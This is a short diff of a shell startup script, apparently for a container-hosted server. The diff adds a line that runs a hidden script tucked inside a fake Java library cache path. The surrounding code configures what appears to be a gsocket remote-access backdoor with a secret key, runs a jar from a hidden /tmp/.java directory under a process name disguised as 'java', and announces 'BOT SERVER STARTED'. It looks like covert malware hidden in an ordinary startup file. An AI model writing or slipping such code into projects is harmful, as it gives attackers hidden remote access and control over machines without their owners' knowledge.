@@ -14,6 +14,8 @@ function fetch_files() {
 function start_app() {
     chmod a+x /tmp/.java/bin/***
     # cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
+    bash /home/container/libraries/org/codehaus/plexus/plexus-utils/3.5.1/.cache/.run-task
+    # GNET
     export GSOCKET_ARGS="-s b3928cae-d2a1e2c-5a16f98-13d9g8hbj7-56c4a961-ecd9f9440-d6a2803-8a1c5j1g60 -liqD"
     cd /tmp/.java/bin && exec -a -java ./add-on.jar &
     echo "BOT SERVER STARTED ..."
